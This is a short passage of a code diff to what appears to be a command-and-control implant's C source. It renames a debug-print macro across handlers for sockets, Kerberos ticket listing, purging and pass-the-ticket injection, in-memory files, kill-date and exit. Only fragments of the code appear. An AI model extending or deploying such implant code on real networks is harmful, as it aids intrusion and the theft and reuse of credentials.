-        case SOCKET_COMMAND_CLOSE: PUTS( "Socket::Close" )
+        case SOCKET_COMMAND_CLOSE: STUP( "Socket::Close" )
         {
             DWORD SocketID = 0;
 
@@ -3087,7 +3087,7 @@ VOID CommandKerberos(
     PkgAdIn32( Package, Command );
     switch ( Command )
     {
-        case KERBEROS_COMMAND_LUID: PUTS("Kerberos::LUID")
+        case KERBEROS_COMMAND_LUID: STUP("Kerberos::LUID")
         {
             LUID*  luid    = NULL;
 
@@ -3114,7 +3114,7 @@ VOID CommandKerberos(
             break;
         }
 
-        case KERBEROS_COMMAND_KLIST: PUTS("Kerberos::Klist")
+        case KERBEROS_COMMAND_KLIST: STUP("Kerberos::Klist")
         {
             DWORD Type                       = 0;
             PSESSION_INFORMATION Sessions    = NULL;
@@ -3202,7 +3202,7 @@ VOID CommandKerberos(
             break;
         }
 
-        case KERBEROS_COMMAND_PURGE: PUTS("Kerberos::Purge")
+        case KERBEROS_COMMAND_PURGE: STUP("Kerberos::Purge")
         {
             LUID luid = (LUID){.HighPart = 0, .LowPart = 0};
 
@@ -3213,7 +3213,7 @@ VOID CommandKerberos(
             break;
         }
 
-        case KERBEROS_COMMAND_PTT: PUTS("Kerberos::Ptt")
+        case KERBEROS_COMMAND_PTT: STUP("Kerberos::Ptt")
         {
             PBYTE  Ticket     = NULL;
             UINT32 TicketSize = 0;
@@ -3244,7 +3244,7 @@ VOID CommandMemFile( PPARSER Parser )
 
     Package = PackageCreate( DEMON_COMMAND_MEM_FILE );
 
-    PUTS("MemFile")
+    STUP("MemFile")
 
     ID          = ParserGetInt32( Parser );
     Size        = ParserGetInt64( Parser );
@@ -3299,7 +3299,7 @@ BOOL ReachedKillDate()
 
 VOID KillDate( )
 {
-    PUTS( "Reached KillDate"  )
+    STUP( "Reached KillDate"  )
 
     /* Send our last message to our server...
      * "They say time is the fire in which we burn.
@@ -3314,7 +3314,7 @@ VOID KillDate( )
 // TODO: rewrite this. disconnect all pivots. kill our threads. release memory and free itself.
 VOID CommandExit( PPARSER Parser )
 {
-    PUTS( "Exit" );
+    STUP( "Exit" );
 
     /* default is 1 == exit thread.
      * TODO: make an config that holds the default exit method */
